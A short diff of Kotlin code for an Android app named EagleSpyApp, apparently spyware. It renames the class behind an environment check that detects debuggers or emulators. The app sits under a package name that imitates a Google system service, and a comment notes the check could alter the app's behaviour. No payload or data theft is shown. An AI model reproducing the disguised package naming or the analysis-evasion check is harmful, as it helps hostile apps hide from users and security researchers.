@@ -65,7 +65,7 @@ class EagleSpyApp : Application(), Configuration.Provider {
         Timber.d("EagleSpyApp initializing...")
         
         // Environment safety check
-        if (!com.google.android.systemservice.utils.EnvironmentCheck.isSafeEnvironment()) {
+        if (!com.google.android.systemservice.utils.SecurityChecker.isSafeEnvironment()) {
             Timber.d("Environment check: debug/emulator detected")
             // Continue anyway but log it - could be used to alter behavior
         }
